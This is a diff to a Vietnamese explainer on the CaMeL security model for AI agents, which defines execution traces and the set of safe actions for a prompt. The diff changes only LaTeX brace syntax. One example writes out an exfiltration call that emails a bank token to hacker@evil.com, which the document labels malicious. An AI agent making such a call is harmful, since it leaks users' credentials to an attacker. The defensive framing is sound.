@@ -30,7 +30,7 @@ Hệ thống tác tử trong mô hình của CaMeL được trừu tượng hóa
 2. **Bộ nhớ / Trạng thái Môi trường ($\mathsf{mem}$):** Không gian dữ liệu đọc/ghi mà các công cụ tương tác (ví dụ: danh sách file trên ổ đĩa, hộp thư đến, số dư tài khoản ngân hàng).
 3. **Tập Công cụ ($\mathsf{tools}$):** Tập hợp các hàm/API định sẵn mà tác tử có thể gọi để tương tác với thế giới bên ngoài (ví dụ: `read_file`, `send_email`, `transfer_money`).
 4. **Tác tử ($\mathsf{Agent}$):** Một quy trình tính toán nhận đầu vào gồm: câu lệnh $\mathsf{prompt}$, tập công cụ $\mathsf{tools}$, và trạng thái bộ nhớ ban đầu $\mathsf{mem}$. Khi chạy xong, tác tử sinh ra một **Vết Thực Thi ($\mathsf{Trace}$)**:
-   $$\mathsf{Trace} = \big\{ (\mathsf{tool}_1, \mathsf{args}_1, \mathsf{mem}_1), (\mathsf{tool}_2, \mathsf{args}_2, \mathsf{mem}_2), \dots, (\mathsf{tool}_k, \mathsf{args}_k, \mathsf{mem}_k) \big\}$$
+   $$\mathsf{Trace} = \left\lbrace (\mathsf{tool}_1, \mathsf{args}_1, \mathsf{mem}_1), (\mathsf{tool}_2, \mathsf{args}_2, \mathsf{mem}_2), \dots, (\mathsf{tool}_k, \mathsf{args}_k, \mathsf{mem}_k) \right\rbrace$$
    Trong đó mỗi phần tử ghi lại: công cụ nào đã được gọi, tham số truyền vào là gì, và trạng thái bộ nhớ tại thời điểm gọi.
 
 ---
@@ -39,7 +39,7 @@ Hệ thống tác tử trong mô hình của CaMeL được trừu tượng hóa
 
 Đối với mỗi câu lệnh $\mathsf{prompt}$, tồn tại một tập hợp các hành động an toàn cho phép, ký hiệu là $\Omega_{\mathsf{prompt}}$.
 
-$$\Omega_{\mathsf{prompt}} = \big\{ (\mathsf{tool}, \mathsf{args}, \mathsf{mem}_{\text{step}}) \mid \text{Hành động này phù hợp với ý định của prompt và không vi phạm an ninh} \big\}$$
+$$\Omega_{\mathsf{prompt}} = \left\lbrace (\mathsf{tool}, \mathsf{args}, \mathsf{mem}_{\text{step}}) \mid \text{Hành động này phù hợp với ý định của prompt và không vi phạm an ninh} \right\rbrace$$
 
 - **Ví dụ 1:** Nếu $\mathsf{prompt}$ là *"Hãy đọc email của sếp và tóm tắt lại"*, thì việc gọi `read_email(folder="Inbox")` và `print(summary)` nằm trong $\Omega_{\mathsf{prompt}}$.
 - **Ví dụ 2:** Nếu hành động trong vết thực thi xuất hiện `send_email(to="hacker@evil.com", body=token_ngan_hang)`, thì bộ ba này **không thuộc** $\Omega_{\mathsf{prompt}}$ và bị coi là hành vi độc hại.
